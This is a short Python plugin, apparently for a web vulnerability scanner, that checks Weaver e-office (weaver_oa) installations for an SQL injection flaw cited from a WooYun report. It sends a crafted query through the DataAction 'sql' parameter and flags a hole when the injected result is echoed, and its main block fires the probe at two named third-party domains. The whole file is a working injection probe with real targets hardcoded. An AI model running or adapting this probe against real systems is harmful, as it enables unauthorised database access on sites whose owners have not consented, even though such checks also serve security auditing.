#!/usr/bin/python
#-*- encoding:utf-8 -*-
#__author__ = '1c3z'
#ref:http://www.wooyun.org/bugs/wooyun-2015-0130759

def assign(service, arg):
    if service == "weaver_oa":
        return True, arg


def audit(arg):
    payload = 'ServiceAction/com.eweaver.base.DataAction?sql=select%201,2,3,4,5,6,7,8,9,10%20from%20DUAL%20'
    url = arg + payload
    code, head,res, errcode, _ = curl.curl2(url)
    if code == 200 and '1,3,5,7,9__2 4 6 8 10' in res:
        security_hole(url)
                        
if __name__ == '__main__':
    from dummy import *
    audit(assign('weaver_oa', 'http://oa.acgmc.com/')[1])
    audit(assign('weaver_oa', 'http://snkbj.bluefocusgroup.com/')[1])